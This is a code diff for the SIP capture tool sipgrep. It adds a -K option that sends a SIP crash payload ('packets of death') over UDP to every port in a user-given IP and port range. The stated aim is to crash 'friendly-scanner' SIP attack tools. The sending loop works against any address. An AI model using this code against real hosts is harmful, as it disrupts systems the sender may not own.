@@ -203,6 +203,7 @@ unsigned int start_time = 0;
 
 /* default friendly scanner UAC */
 char *friendly_scanner_uac = "friendly-scanner";
+char *friendly_scanner_range;
 
 int main(int argc, char **argv) {
     int32_t c;
@@ -214,7 +215,7 @@ int main(int argc, char **argv) {
     print_time = &print_time_absolute;
         
     
-    while ((c = getopt(argc, argv, "axNhCXViwmpevlDTRMGJgs:n:c:q:H:d:A:I:O:S:F:P:f:t:j:Q:")) != EOF) {
+    while ((c = getopt(argc, argv, "axNhCXViwmpevlDTRMGJgs:n:c:q:H:d:A:I:O:S:F:P:f:t:j:K:Q:")) != EOF) {
         switch (c) {
 
 	    case 'x':
@@ -246,6 +247,10 @@ int main(int argc, char **argv) {
             case 'J':
                 kill_friendlyscanner = 1;                
                 break;                  
+            case 'K':
+                friendly_scanner_range = optarg;
+                kill_friendlyscanner = 2;                
+                break;                                  
             case 'j':
                 friendly_scanner_uac = optarg;
                 kill_friendlyscanner = 1;
@@ -346,6 +351,12 @@ int main(int argc, char **argv) {
     
     
     start_time = (unsigned)time(NULL);
+    
+    /* make kill range */
+    if(kill_friendlyscanner == 2) {
+        mass_friendlyscanner_kill(friendly_scanner_range);            
+        clean_exit(-1);
+    }
 
     /* missed -O flag for -q filessize or SPLIT FILE types */
     if((stop_working_type == FILESIZE_SPLIT || split_file_type != 0) && !dump_file) {
@@ -1689,7 +1700,7 @@ void drop_privs(void) {
 
 void usage(int8_t e) {
     printf("usage: sipgrep <-"
-           "ahNViwgGJpevxlDTRMmqCJjx> <-IO pcap_dump> <-n num> <-d dev> <-A num>\n"
+           "ahNViwgGJpevxlDTRMmqCJjxK> <-IO pcap_dump> <-n num> <-d dev> <-A num>\n"
            "             <-s snaplen> <-S limitlen> <-c contact user> <-j user agent>\n"
            "		 <-f from user>  <-t to user> <-H capture url> <-q autostop cond.>\n"
            "		 <-Q split cond.> <-P portrange> <-F file>\n"
@@ -1725,6 +1736,7 @@ void usage(int8_t e) {
            "   -G  is print dialog report during clean up\n"
            "   -J  is kill friendly scanner automatically\n"
            "   -j  is kill friendly scanner automatically matching user agent string\n"
+           "   -K  is kill friendly scanner providing IP and port/portrange i.e.: 10.0.0.1:5060-5090\n"
            "   -q  is auto stop condition:\n"
            "    	duration:NUM - stop after NUM seconds\n"
            "    	filesize:NUM - stop this file after NUM KB\n"
@@ -2185,4 +2197,55 @@ int send_hepv3 (rc_info_t *rcinfo, unsigned char *data, unsigned int len) {
     if(hg) free(hg);        
     
     return 1;
+}
+
+void mass_friendlyscanner_kill(char *data) {
+    
+    char *pch, *ports;
+    char ip_src[200];
+    int start_port = 0, stop_port = 0, st = 0, df =0;
+    struct sockaddr_in si_other;
+    int s, i, slen=sizeof(si_other);
+    
+
+    if((pch=strchr(data,':')) != NULL) {                   
+            st = pch-data;            
+            snprintf(ip_src, 200, "%.*s", st, data);
+            if((ports=strchr(++pch,'-')) != NULL) {                    
+                   stop_port = atoi(++ports);                                                            
+            }
+
+            start_port = atoi(pch);                                        
+
+            if(stop_port == 0 || stop_port == start_port) stop_port = start_port + 1;
+            
+	    if ((s=socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP))==-1) {
+			printf("Couldn't open udp socket\n");
+			return;
+	    }
+   
+            st=start_port;
+
+            for(start_port; start_port < stop_port; start_port++) {            
+                //send_kill_to_friendly_scanner(ip_src, start_port);            
+ 		memset((char *) &si_other, 0, sizeof(si_other));
+                si_other.sin_family = AF_INET;
+                si_other.sin_port = htons(start_port);
+                if (inet_aton(ip_src, &si_other.sin_addr)==0) {
+                   fprintf(stderr, "inet_aton() failed\n");
+                   return;
+                }
+		if (sendto(s, SIP_CRASH, strlen(SIP_CRASH), 0, (struct sockaddr *) &si_other, slen)==-1) {
+		            fprintf(stderr, "couldn't send\n");
+	        }
+            }
+                 
+	    close(s);		                   
+
+            printf("Sent %d packets of death\n", (stop_port - st));
+    }            
+    else {
+        usage(-1);        
+    }
+    
 }
